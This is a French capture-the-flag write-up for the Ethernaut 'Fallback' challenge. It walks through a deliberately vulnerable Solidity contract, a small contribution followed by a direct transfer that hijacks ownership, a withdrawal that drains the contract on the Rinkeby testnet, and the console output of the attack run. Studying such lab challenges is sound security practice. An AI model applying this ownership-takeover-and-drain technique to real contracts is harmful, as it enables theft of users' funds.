# Fallback

## Objectifs
Les objectifs de ce niveau sont:
1- devenir le owner du contrat
2- réduire la balance du contrat à 0

La méthode [withdraw](contracts/fallback.sol#L37) utilise le `modifier` `onlyOwner`, nous devons donc passer `owner` avant de pouvoir réduire la balance du contrat à 0.

## Devenir owner

Le contrat donne la possibilité de devenir `owner` avec les méthodes suivantes:
- [`contribute`](contracts/fallback.sol#L29)
- [`receive`](contracts/fallback.sol#L43)

Lors de la création du contrat, la contribution du `owner` est de [`1000 ether`](contracts/fallback.sol#L14)
```solidity
constructor() public {
  owner = msg.sender;
  contributions[msg.sender] = 1000 * (1 ether);
}
```
Pour devenir `owner` via la méthode `contribute`, il est nécessaire de fournir une contribution plus importante que celle du `owner` mais cette méthode limite le `msg.value` à `0.001 ether`:
```solidity
function contribute() public payable {
  require(msg.value < 0.001 ether);
  contributions[msg.sender] += msg.value;
  if(contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
  }
}
```

Pour devenir `owner` via la méthode `receive`, il faut que la contribution soit supérieure à 0 et qu'il y ait de la valeur associé à cet appel:
```solidity
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```

Afin de devenir `owner`, il faut appeller la méthode `contribute` avec un `msg.value` < `0.001 ether` ce qui permet d'avoir une contribution > 0.
Ensuite en envoyant des fonds à l'adresse du contrat, la méthode `receive` va être appellée et ainsi nous devenons `owner` du contrat.

## Récupération des fonds du contrat
Une fois que nous sommes owner, nous pouvons appeller la méthode `withdraw` qui nous permet de récupérer la totalité des fonds du contrat

## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run attack main "0x4c7c62Ed79994383EEa5Cf156bd3159e9e12C385" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

FallbackProject is the active project.

Running 'scripts/attack.py::main'...
Transaction sent: 0x4eb894692e6cc551ca59a862ad7fe413f7d5b60e6e8aecfce7ee80ce8de5dadc
  Gas price: 1.200002455 gwei   Gas limit: 52813   Nonce: 194
  Transaction confirmed   Block: 10180337   Gas used: 48012 (90.91%)

Transaction sent: 0x069866c60d8df2e3bc6822d6f1c0902933b5c813783f1cde4bcb095aebc4201d
  Gas price: 1.200002456 gwei   Gas limit: 31183   Nonce: 195
  Transaction confirmed   Block: 10180338   Gas used: 28349 (90.91%)

Owner is hacker: True
Transaction sent: 0x18d92043ec34c686a2dff520680ddbbe08b5c70d23f43a598da6292c157be4ff
  Gas price: 1.200002459 gwei   Gas limit: 35918   Nonce: 196
  Transaction confirmed   Block: 10180339   Gas used: 30398 (84.63%)

Final contract balance: 0
```




